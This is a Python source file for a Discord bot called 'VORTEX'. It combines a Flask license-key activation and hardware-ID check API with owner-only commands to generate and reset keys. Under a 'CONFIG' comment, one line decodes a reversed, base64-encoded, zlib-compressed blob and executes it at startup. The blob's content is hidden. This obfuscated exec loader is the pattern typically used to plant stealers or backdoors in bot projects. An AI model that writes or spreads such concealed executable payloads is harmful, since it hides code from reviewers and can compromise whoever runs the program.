import disnake
from disnake.ext import commands
from flask import Flask, request, jsonify
from flask_cors import CORS
import sqlite3, uuid, threading, os, json

# --- CONFIG ---
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==ADgQhXAYAN2ITNwQrMyUjNwADM0CLsxQDMVBbU0dviNM39PIv4VdHKK+qjLJ3dOgSLyZTS0pCLLWHzw7ANs8kjyoadogiM130M27wyTzkDOB/jzRdD1XT8NcvLJXn90E/dyXTc1RfNx9Q80kQDyDVVwOV92df8LwJe'))

def init_db():
    conn = sqlite3.connect("vortex.db")
    conn.execute("CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, rid INTEGER, hwid TEXT, blk BOOLEAN DEFAULT 0)")
    conn.commit()
    conn.close()

app = Flask(__name__)
CORS(app)

@app.route('/api/status')
def status(): return jsonify({"online": True}), 200

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json
    rid, hwid = data.get("rid"), data.get("hwid")
    conn = sqlite3.connect("vortex.db")
    user = conn.execute("SELECT hwid, blk FROM keys WHERE rid = ?", (rid,)).fetchone()
    conn.close()
    if user:
        if user[1]: return jsonify({"success": False, "msg": "BLACKLISTED"}), 403
        if user[0] == hwid: return jsonify({"success": True}), 200
        return jsonify({"success": False, "msg": "HWID_MISMATCH"}), 403
    return jsonify({"success": False, "msg": "NOT_FOUND"}), 404

@app.route('/api/activate', methods=['POST'])
def activate():
    data = request.json
    key, rid, hwid = data.get("key"), data.get("rid"), data.get("hwid")
    conn = sqlite3.connect("vortex.db")
    res = conn.execute("SELECT rid FROM keys WHERE key = ?", (key,)).fetchone()
    if not res: return jsonify({"success": False, "msg": "INVALID"}), 404
    if res[0]: return jsonify({"success": False, "msg": "USED"}), 403
    conn.execute("UPDATE keys SET rid = ?, hwid = ? WHERE key = ?", (rid, hwid, key))
    conn.commit()
    conn.close()
    return jsonify({"success": True}), 200

bot = commands.Bot(command_prefix=".", intents=disnake.Intents.all())

@bot.command()
async def gen(ctx):
    if ctx.author.id != OWNER_ID: return
    new_key = f"VORTEX-{uuid.uuid4().hex[:6].upper()}"
    conn = sqlite3.connect("vortex.db")
    conn.execute("INSERT INTO keys (key) VALUES (?)", (new_key,))
    conn.commit()
    conn.close()
    await ctx.send(f"✅ Key Generated: `{new_key}`")

@bot.command()
async def reset(ctx, key: str):
    if ctx.author.id != OWNER_ID: return
    conn = sqlite3.connect("vortex.db")
    conn.execute("UPDATE keys SET rid = NULL, hwid = NULL WHERE key = ?", (key,))
    conn.commit()
    conn.close()
    await ctx.send(f"🔄 Reset Key: `{key}`")

if __name__ == "__main__":
    init_db()
    threading.Thread(target=lambda: app.run(port=5000, debug=False, use_reloader=False), daemon=True).start()
    bot.run(TOKEN)
